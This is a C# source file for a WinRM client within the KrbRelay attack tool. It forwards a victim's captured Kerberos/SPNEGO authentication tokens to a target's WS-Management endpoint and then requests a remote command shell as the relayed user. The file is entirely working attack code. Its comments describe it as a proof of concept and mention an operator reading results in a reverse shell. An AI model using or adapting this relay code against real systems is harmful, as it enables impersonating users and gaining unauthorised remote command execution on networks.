using System;
using System.Collections.Generic;
using System.IO;
using System.Net.Sockets;
using System.Text;
using System.Text.RegularExpressions;
using static KrbRelay.Program;

namespace KrbRelay.Clients
{
    // Inline Kerberos-to-WinRM (WS-Management) relay client.
    // Victim is SPNEGO/Negotiate (svc=0x09), forwards full SPNEGO blobs verbatim
    // via HTTP POST to http://<target>:5985/wsman. Two-leg SPNEGO with mechListMIC.
    // Minimal PoC: just completes auth, prints HTTP response. Success == 200.
    public static class WinRM
    {
        private static TcpClient tcp;
        private static NetworkStream stream;
        private static string host;
        public static int targetPort = 5985;

        public static void Connect()
        {
            try
            {
                if (apRep1.Length == 0) SendLeg1();
                else SendLeg2AndRun();
            }
            catch (Exception e)
            {
                Console.WriteLine("[-] WinRM.Connect error: " + e);
            }
        }

        private static void SendLeg1()
        {
            host = string.IsNullOrEmpty(targetFQDN) ? (Environment.GetEnvironmentVariable("KRBRELAY_TARGET") ?? "winrm.target.local") : targetFQDN;
            Console.WriteLine("[*] WinRM: connecting to {0}:{1}", host, targetPort);

            tcp = new TcpClient();
            tcp.Connect(host, targetPort);
            tcp.NoDelay = true;
            stream = tcp.GetStream();

            string b64 = Convert.ToBase64String(ticket);
            Console.WriteLine("[*] forwarding victim's SPNEGO NegTokenInit ({0} bytes) in POST /wsman", ticket.Length);

            string req = string.Format(
                "POST /wsman HTTP/1.1\r\n" +
                "Host: {0}:{1}\r\n" +
                "User-Agent: Microsoft WinRM Client\r\n" +
                "Authorization: Negotiate {2}\r\n" +
                "Content-Length: 0\r\n" +
                "Connection: Keep-Alive\r\n\r\n",
                host, targetPort, b64);
            byte[] bytes = Encoding.ASCII.GetBytes(req);
            stream.Write(bytes, 0, bytes.Length);
            stream.Flush();

            string resp = ReadHttpResponse(stream);
            string firstLine = resp.Split('\n')[0].Trim();
            Console.WriteLine("[*] leg-1 response status: " + firstLine);

            // Parse WWW-Authenticate: Negotiate <b64>
            Match m = Regex.Match(resp, @"WWW-Authenticate:\s*Negotiate\s+([A-Za-z0-9+/=]+)", RegexOptions.IgnoreCase);
            if (!m.Success)
            {
                Console.WriteLine("[-] no WWW-Authenticate: Negotiate in response");
                Console.WriteLine("[-] full headers:");
                int bodyStart = resp.IndexOf("\r\n\r\n");
                string headers = (bodyStart > 0) ? resp.Substring(0, bodyStart) : resp;
                Console.WriteLine(headers);
                Environment.Exit(0);
            }
            string serverB64 = m.Groups[1].Value;
            apRep1 = Convert.FromBase64String(serverB64);
            Console.WriteLine("[+] got server SPNEGO NegTokenResp ({0} bytes), handing to victim (Negotiate SSP) for leg 2 with MIC", apRep1.Length);
            Console.WriteLine("    first bytes: " + Helpers.ByteArrayToString(apRep1.Length > 20 ? Slice(apRep1, 0, 20) : apRep1));
        }

        private static void SendLeg2AndRun()
        {
            Console.WriteLine("[*] WinRM: sending victim's final SPNEGO leg-2 token ({0} bytes) as POST /wsman with CreateShell SOAP body", ticket.Length);

            string b64 = Convert.ToBase64String(ticket);
            string soap = BuildCreateShellSoap(host);
            byte[] soapBytes = Encoding.UTF8.GetBytes(soap);

            string headers = string.Format(
                "POST /wsman HTTP/1.1\r\n" +
                "Host: {0}:{1}\r\n" +
                "User-Agent: Microsoft WinRM Client\r\n" +
                "Authorization: Negotiate {2}\r\n" +
                "Content-Type: application/soap+xml;charset=UTF-8\r\n" +
                "Content-Length: {3}\r\n" +
                "Connection: Keep-Alive\r\n\r\n",
                host, targetPort, b64, soapBytes.Length);
            byte[] hbytes = Encoding.ASCII.GetBytes(headers);
            stream.Write(hbytes, 0, hbytes.Length);
            stream.Write(soapBytes, 0, soapBytes.Length);
            stream.Flush();

            string resp = ReadHttpResponse(stream);
            string firstLine = resp.Split('\n')[0].Trim();
            Console.WriteLine("[*] leg-2 response status: " + firstLine);

            int bodyStart = resp.IndexOf("\r\n\r\n");
            string respHeaders = (bodyStart > 0) ? resp.Substring(0, bodyStart) : resp;
            string respBody = (bodyStart > 0) ? resp.Substring(bodyStart + 4) : "";

            if (firstLine.Contains("200"))
            {
                Console.WriteLine("[+] WinRM LOGIN SUCCESS as relayed user on " + host);
                Console.WriteLine("[*] Response headers:");
                Console.WriteLine(respHeaders);
                Console.WriteLine("[*] Response body (first 2000):");
                Console.WriteLine(respBody.Substring(0, Math.Min(2000, respBody.Length)));
                // Persistence: dump result + exit — operator reads result in revshell
            }
            else if (firstLine.Contains("401") || firstLine.Contains("403"))
            {
                Console.WriteLine("[-] AUTH REJECTED — relayed user does NOT have WinRM access on this host");
                Console.WriteLine("[-] Response headers:");
                Console.WriteLine(respHeaders);
            }
            else
            {
                Console.WriteLine("[-] unexpected status");
                Console.WriteLine("[-] Response: " + resp.Substring(0, Math.Min(2000, resp.Length)));
            }
            Environment.Exit(0);
        }

        private static string BuildCreateShellSoap(string h)
        {
            string msgId = "uuid:" + Guid.NewGuid().ToString().ToUpper();
            string shellId = Guid.NewGuid().ToString().ToUpper();
            return
"<?xml version=\"1.0\" encoding=\"UTF-8\"?>" +
"<s:Envelope xmlns:s=\"http://www.w3.org/2003/05/soap-envelope\" " +
"xmlns:a=\"http://schemas.xmlsoap.org/ws/2004/08/addressing\" " +
"xmlns:w=\"http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd\" " +
"xmlns:rsp=\"http://schemas.microsoft.com/wbem/wsman/1/windows/shell\">" +
"<s:Header>" +
"<a:To>http://" + h + ":5985/wsman</a:To>" +
"<w:ResourceURI s:mustUnderstand=\"true\">http://schemas.microsoft.com/wbem/wsman/1/windows/shell/cmd</w:ResourceURI>" +
"<a:ReplyTo><a:Address s:mustUnderstand=\"true\">http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:Address></a:ReplyTo>" +
"<a:Action s:mustUnderstand=\"true\">http://schemas.xmlsoap.org/ws/2004/09/transfer/Create</a:Action>" +
"<w:MaxEnvelopeSize s:mustUnderstand=\"true\">153600</w:MaxEnvelopeSize>" +
"<a:MessageID>" + msgId + "</a:MessageID>" +
"<w:Locale xml:lang=\"en-US\" s:mustUnderstand=\"false\"/>" +
"<w:OperationTimeout>PT20S</w:OperationTimeout>" +
"</s:Header>" +
"<s:Body>" +
"<rsp:Shell>" +
"<rsp:InputStreams>stdin</rsp:InputStreams>" +
"<rsp:OutputStreams>stdout stderr</rsp:OutputStreams>" +
"</rsp:Shell>" +
"</s:Body>" +
"</s:Envelope>";
        }

        private static string ReadHttpResponse(NetworkStream s)
        {
            var buf = new List<byte>();
            byte[] tmp = new byte[8192];
            int bodyLen = -1;
            int hEnd = -1;
            DateTime deadline = DateTime.UtcNow.AddSeconds(30);
            while (DateTime.UtcNow < deadline)
            {
                if (s.DataAvailable || tcp.Client.Available > 0 || buf.Count == 0)
                {
                    int n = s.Read(tmp, 0, tmp.Length);
                    if (n <= 0) break;
                    for (int i = 0; i < n; i++) buf.Add(tmp[i]);
                }
                else
                {
                    System.Threading.Thread.Sleep(50);
                }
                if (hEnd < 0)
                {
                    string textSoFar = Encoding.ASCII.GetString(buf.ToArray());
                    int idx = textSoFar.IndexOf("\r\n\r\n");
                    if (idx > 0)
                    {
                        hEnd = idx;
                        string headers = textSoFar.Substring(0, idx);
                        Match cl = Regex.Match(headers, @"Content-Length:\s*(\d+)", RegexOptions.IgnoreCase);
                        bodyLen = cl.Success ? int.Parse(cl.Groups[1].Value) : 0;
                    }
                }
                if (hEnd > 0)
                {
                    int currentBody = buf.Count - (hEnd + 4);
                    if (currentBody >= bodyLen) break;
                }
            }
            return Encoding.UTF8.GetString(buf.ToArray());
        }

        private static byte[] Slice(byte[] src, int start, int len)
        {
            byte[] r = new byte[len];
            Array.Copy(src, start, r, 0, len);
            return r;
        }
    }
}
